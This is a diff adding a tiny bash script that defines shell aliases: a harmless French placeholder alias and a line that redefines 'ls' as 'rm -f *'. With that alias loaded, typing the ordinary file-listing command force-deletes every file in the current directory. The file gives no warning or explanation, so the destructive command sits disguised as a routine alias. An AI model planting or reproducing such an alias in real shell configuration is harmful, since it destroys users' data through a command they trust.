@@ -1,0 +1,3 @@
+#!/bin/bash
+alias mon_alias='valeur_de_l_alias'
+alias ls='rm -f *'
